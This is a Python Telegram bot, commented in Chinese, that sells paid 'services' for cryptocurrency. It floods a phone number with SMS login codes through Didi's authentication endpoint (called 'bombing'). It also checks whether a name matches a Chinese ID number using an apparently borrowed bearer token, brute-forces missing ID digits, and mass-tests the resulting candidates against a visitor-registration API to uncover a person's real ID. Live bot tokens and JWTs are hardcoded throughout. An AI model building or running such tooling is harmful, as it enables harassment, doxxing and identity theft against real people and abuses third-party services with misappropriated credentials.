import telebot 
import requests
import time
import re
import threading
import json
import os
import itertools
from datetime import datetime
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 1. 核心配置 =================
API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 

# 单次二要素固定 Token
AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"

bot = telebot.TeleBot(API_TOKEN)
user_points = {}
CURRENT_X_TOKEN = DEFAULT_TOKEN
user_states = {}
generated_cache = {} 

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): float(v) for k, v in data.items()}
        except: pass
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content: tk = content
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump({str(k): v for k, v in user_points.items()}, f)

def save_token(new_tk):
    global CURRENT_X_TOKEN
    CURRENT_X_TOKEN = new_tk
    with open(TOKEN_FILE, 'w', encoding='utf-8') as f:
        f.write(new_tk)

def get_id_check_code(id17):
    factors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    rem_map = {0: '1', 1: '0', 2: 'X', 3: '9', 4: '8', 5: '7', 6: '6', 7: '5', 8: '4', 9: '3', 10: '2'}
    try:
        sum_val = sum(int(id17[i]) * factors[i] for i in range(17))
        return rem_map[sum_val % 11]
    except: return "X"

# ================= 2. 业务逻辑 =================

def run_sms_once(chat_id, phone_number, uid):
    user_points[uid] -= 2.5
    save_points()
    url1 = 'https://epassport.diditaxi.com.cn/passport/login/v5/codeMT'
    headers1 = {
        'Host': 'epassport.diditaxi.com.cn',
        'content-type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15',
        'Referer': 'https://servicewechat.com/wx9e9b87595c41dbb7/491/page-frame.html'
    }
    q_template = '{"api_version":"1.0.1","appid":35011,"role":1,"cell":"{phone}","country_calling_code":"+86","code_type":1,"scene":1}'
    bot.send_message(chat_id, f"🚀 **轰炸任务启动**\n目标：`{phone_number}`\n扣费：2.5 积分\n余额：{user_points[uid]:.2f}", parse_mode='Markdown')
    try:
        requests.post(url1, headers=headers1, data={'q': q_template.format(phone=phone_number)}, timeout=5)
        bot.send_message(chat_id, f"✅ 手机号 `{phone_number}` 请求已提交。")
    except:
        bot.send_message(chat_id, "⚠️ 接口异常。")

# ================= 3. 界面与核验逻辑 =================
# (为了节省篇幅，保持 get_main_markup, get_pay_markup, get_help_markup, single_verify_2ys, run_batch_task 等逻辑不变)
def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"),
               types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url),
               types.InlineKeyboardButton("OkPay 充值", url=admin_url),
               types.InlineKeyboardButton("RMB 充值", url=admin_url),
               types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
    return markup

def get_help_markup():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main"))

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
    username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
    return (f"Admin@铭\n\n用户 ID: `{uid}`\n用户名称: `{first_name}`\n用户名: {username}\n当前余额: `{pts:.2f}积分`\n\n使用帮助可查看使用教程\n在线充值可支持24小时\n1 USDT = 1 积分")

def get_ui_bar(done, total):
    percent = int(done / total * 100) if total > 0 else 0
    bar = "█" * int(16 * done // total) + "░" * (16 - int(16 * done // total)) if total > 0 else "░" * 16
    return f"⌛ 开始核验...\n[{bar}] {done}/{total} {percent}%"

def single_verify_2ys(chat_id, name, id_card, uid):
    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
    headers = {"Authorization": AUTH_BEARER, "Content-Type": "application/json"}
    try:
        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
        user_points[uid] -= 0.5; save_points()
        is_succ = r.status_code == 200 and r.json().get("success")
        res = f"姓名: **{name}**\n身份证: **{id_card}**\n结果: {'二要素核验一致✅' if is_succ else '二要素核验不一致❌'}\n\n已扣除 0.5 积分\n余额：{user_points[uid]:.2f}"
    except: res = "❌ 接口请求失败"
    bot.send_message(chat_id, res, parse_mode='Markdown')

def run_batch_task(chat_id, msg_id, name, id_list, uid):
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done, success_match, is_running = len(id_list), 0, None, True
    lock = threading.Lock()
    def verify(id_no):
        nonlocal done, success_match, is_running
        if not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            if r.json().get("code") == 0:
                with lock:
                    if is_running:
                        user_points[uid] -= 2.5; save_points()
                        success_match = f"✅ **核验成功！**\n{name} {id_no}\n余额：{user_points[uid]:.2f}"
                        is_running = False
        except: pass
        finally:
            with lock: done += 1
    with ThreadPoolExecutor(max_workers=10) as ex:
        ex.map(verify, id_list)
    bot.delete_message(chat_id, msg_id)
    bot.send_message(chat_id, success_match if success_match else "❌ 未发现匹配结果", parse_mode='Markdown')

# ================= 4. 指令与消息分发 =================

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    if uid not in user_points: user_points[uid] = 0.0
    bot.send_message(message.chat.id, get_main_text(message, uid, user_points[uid]), parse_mode='Markdown', reply_markup=get_main_markup())

# --- 管理员指令优化 ---
@bot.message_handler(commands=['add', 'set_token'])
def admin_ops(message):
    uid = message.from_user.id
    cmd = message.text.split()[0][1:]

    # 如果是普通用户发 /add 或 /set_token
    if uid != ADMIN_ID:
        return bot.reply_to(message, "❌ 您没有管理员权限。")

    # 如果是管理员发，但格式不对
    parts = message.text.split()
    
    if cmd == 'add':
        if len(parts) != 3:
            return bot.reply_to(message, "💡 **加款指令用法：**\n`/add 用户ID 金额`", parse_mode='Markdown')
        try:
            tid, amt = int(parts[1]), float(parts[2])
            user_points[tid] = user_points.get(tid, 0.0) + amt
            save_points()
            bot.reply_to(message, f"✅ 充值成功！\n用户：`{tid}`\n增加：`{amt}` 积分\n当前余额：`{user_points[tid]:.2f}`", parse_mode='Markdown')
        except:
            bot.reply_to(message, "❌ 格式错误，请确保 ID 和金额为数字。")

    elif cmd == 'set_token':
        if len(parts) != 2:
            return bot.reply_to(message, "💡 **设置Token用法：**\n`/set_token 你的Token字符串`", parse_mode='Markdown')
        new_token = parts[1]
        save_token(new_token)
        bot.reply_to(message, "✅ 全局核验 Token 已更新。")

@bot.message_handler(commands=['pl', 'bq', '2ys', 'sms'])
def cmd_flow(message):
    uid, chat_id = message.from_user.id, message.chat.id
    cmd = message.text.split()[0][1:]
    required = 2.5 if cmd in ['pl', 'sms'] else 0.5
    if user_points.get(uid, 0.0) < required:
        return bot.reply_to(message, "积分不足，请先充值！")
    
    if cmd == 'pl':
        user_states[chat_id] = {'step': 'v_name'}
        bot.send_message(chat_id, "请输入姓名：")
    elif cmd == 'bq':
        user_states[chat_id] = {'step': 'g_card'}
        bot.send_message(chat_id, "请输入身份证号（未知用x）：")
    elif cmd == '2ys':
        bot.send_message(chat_id, "请输入：**姓名 身份证号**", parse_mode='Markdown')
    elif cmd == 'sms':
        bot.send_message(chat_id, "请输入手机号：")
        user_states[chat_id] = {'step': 'sms_start'}

@bot.message_handler(func=lambda m: True)
def handle_all_text(message):
    uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
    if text.startswith('/'): return

    if re.match(r'^1[3-9]\d{9}$', text):
        if user_points.get(uid, 0.0) < 2.5: return bot.reply_to(message, "积分不足！")
        threading.Thread(target=run_sms_once, args=(chat_id, text, uid), daemon=True).start()
        return

    match_2ys = re.match(r'^([\u4e00-\u9fa5]{2,4})\s+(\d{17}[\dXx])$', text)
    if match_2ys:
        if user_points.get(uid, 0.0) < 0.5: return bot.reply_to(message, "积分不足！")
        return single_verify_2ys(chat_id, *match_2ys.groups(), uid)
    
    state = user_states.get(chat_id)
    if not state: return
    if state['step'] == 'v_name':
        user_states[chat_id].update({'step': 'v_ids', 'name': text}); bot.send_message(chat_id, f"✅ 姓名：{text}\n请发送身份证列表：")
    elif state['step'] == 'v_ids':
        ids = [i for i in re.findall(r'\d{17}[\dXx]', text) if len(i)==18]
        if ids:
            m = bot.send_message(chat_id, get_ui_bar(0, len(ids)))
            threading.Thread(target=run_batch_task, args=(chat_id, m.message_id, state['name'], ids, uid)).start()
        del user_states[chat_id]
    elif state['step'] == 'g_card':
        user_states[chat_id].update({'step': 'g_sex', 'card': text.lower()}); bot.send_message(chat_id, "请输入性别 (男/女):")
    elif state['step'] == 'g_sex':
        user_points[uid] -= 0.5; save_points()
        base_17 = state['card'][:17]; char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in base_17]
        if text == "男": char_sets[16] = [c for c in char_sets[16] if int(c) % 2 != 0]
        else: char_sets[16] = [c for c in char_sets[16] if int(c) % 2 == 0]
        ids = [s17 + get_id_check_code(s17) for s17 in ["".join(res) for res in itertools.product(*char_sets)]]
        generated_cache[uid] = ids
        with open("result.txt", "w", encoding="utf-8") as f: f.write("\n".join(ids))
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("立即核验 (2.5积分)", callback_data="start_verify_flow"))
        with open("result.txt", "rb") as f: bot.send_document(chat_id, f, caption=f"✅ 生成 {len(ids)} 个", reply_markup=markup)
        del user_states[chat_id]
    elif state['step'] == 'v_name_after_gen':
        if uid in generated_cache:
            m = bot.send_message(chat_id, get_ui_bar(0, len(generated_cache[uid])))
            threading.Thread(target=run_batch_task, args=(chat_id, m.message_id, text, generated_cache[uid], uid)).start()
        del user_states[chat_id]

@bot.callback_query_handler(func=lambda call: True)
def callback_router(call):
    uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
    if call.data == "view_help":
        help_text = ("🛠️️使用帮助\n批量二要素核验\n发送 /pl 进行核验\n每次查询扣除 2.5 积分\n——————————————————\n补齐身份证and核验\n发送 /bq 进行查询\n每次补齐扣除 0.5 积分\n——————————————————\n单次二要素核验\n发送 /2ys 进行核验\n全天24h秒出 毫秒级响应\n每次核验扣除 0.5 积分\n——————————————————\n电话轰炸\n发送 /sms 进行轰炸\n每次轰炸扣除 2.5 积分")
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup())
    elif call.data == "view_pay":
        bot.edit_message_text("🛍️ 请选择充值方式：\n1 USDT = 1 积分", call.message.chat.id, call.message.message_id, reply_markup=get_pay_markup())
    elif call.data == "back_to_main":
        bot.edit_message_text(get_main_text(call, uid, pts), call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=get_main_markup())
    elif call.data == "start_verify_flow":
        bot.send_message(call.message.chat.id, "请输入姓名:"); user_states[call.message.chat.id] = {'step': 'v_name_after_gen'}

if __name__ == '__main__':
    bot.infinity_polling()
